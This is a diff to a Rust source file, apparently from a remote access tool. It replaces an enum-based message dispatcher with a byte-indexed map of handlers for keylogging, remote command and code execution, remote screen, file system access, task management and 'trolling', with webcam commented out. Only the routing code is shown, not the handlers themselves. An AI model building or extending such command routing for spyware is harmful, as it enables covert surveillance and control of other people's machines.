@@ -1,65 +1,50 @@
-use crate::handlers::func;
+use std::collections::HashMap;
+
+use lazy_static::lazy_static;
 
 use crate::{
-    handlers::audio::handle_audio, handlers::chat::handle_chat,
-    handlers::file_system::handle_file_system, handlers::func, handlers::func,
-    handlers::keylogger::handle_keylogger, handlers::remote_cmd::handle_remote_cmd,
-    handlers::remote_code_execution::handle_remote_code_execution,
-    handlers::remote_screen::handle_remote_screen, handlers::task_manager::handle_task_manager,
-    handlers::trolling::handle_trolling, handlers::webcam, Connection, Socket,
+    handlers::{
+        audio::Audio,
+        chat::Chat,
+        file_system::FileSystem,
+        func::{Context, Function, HandlerFn},
+        keylogger::KeyLogger,
+        remote_cmd::RemoteCMD,
+        remote_code_execution::RemoteCodeExecution,
+        remote_screen::RemoteScreen,
+        task_manager::TaskManager,
+        trolling::Trolling, // webcam,
+    },
+    Connection, Socket,
 };
 
-#[derive(Eq, Hash, PartialEq, Debug)]
-pub enum MessageType {
-    FileSystem,
-    RemoteScreen,
-    Trolling,
-    RemoteCMD,
-    Audio,
-    TaskManager,
-    Keylogger,
-    Chat,
-    RemoteCodeExecution,
-    Webcam,
-}
+lazy_static! {
+    static ref B_TO_HANDLER: HashMap<u8, HandlerFn> = {
+        let mut m = HashMap::new();
+        m.insert(0, FileSystem::handler as HandlerFn);
+        m.insert(1, RemoteScreen::handler as HandlerFn);
+        m.insert(2, Trolling::handler as HandlerFn);
+        m.insert(3, RemoteCMD::handler as HandlerFn);
+        m.insert(4, Audio::handler as HandlerFn);
+        m.insert(5, TaskManager::handler as HandlerFn);
+        m.insert(6, KeyLogger::handler as HandlerFn);
+        m.insert(7, Chat::handler as HandlerFn);
+        m.insert(8, RemoteCodeExecution::handler as HandlerFn);
+        // m.insert(9, Webcam::handler as HandlerFn);
 
-// Using char so that we can get gazillion-bazillion variations in 1 byte
-
-impl MessageType {
-    pub fn from_char(value: char) -> Option<MessageType> {
-        match value {
-            '0' => Some(MessageType::FileSystem),
-            '1' => Some(MessageType::RemoteScreen),
-            '2' => Some(MessageType::Trolling),
-            '3' => Some(MessageType::RemoteCMD),
-            '4' => Some(MessageType::Audio),
-            '5' => Some(MessageType::TaskManager),
-            '6' => Some(MessageType::Keylogger),
-            '7' => Some(MessageType::Chat),
-            '8' => Some(MessageType::RemoteCodeExecution),
-            '9' => Some(MessageType::Webcam),
-            _ => None,
-        }
-    }
+        m
+    };
 }
 
 pub fn handle_message(
-    message: MessageType,
-    payload: &[u8],
+    bytes: &[u8],
     socket: &mut Socket,
     connection: &Connection,
-) {
-    dbg!(&payload, &message);
-    match message {
-        MessageType::RemoteScreen => handle_remote_screen(payload, connection), // Create new connection instead of passing existing websocket
-        MessageType::FileSystem => handle_file_system(payload, socket),
-        MessageType::Trolling => handle_trolling(payload),
-        MessageType::RemoteCMD => handle_remote_cmd(payload, socket),
-        MessageType::Audio => handle_audio(payload),
-        MessageType::TaskManager => handle_task_manager(payload),
-        MessageType::Keylogger => handle_keylogger(payload),
-        MessageType::Chat => handle_chat(payload, connection),
-        MessageType::RemoteCodeExecution => handle_remote_code_execution(payload),
-        MessageType::Webcam => webcam::handle_webcam(connection),
-    }
+) -> anyhow::Result<()> {
+    let mut ctx = Context::from(socket, connection);
+    let function_handler = B_TO_HANDLER
+        .get(&bytes[0])
+        .ok_or_else(|| anyhow::anyhow!("No such function, recheck first byte of the request"))?;
+
+    function_handler(bytes, &mut ctx)
 }
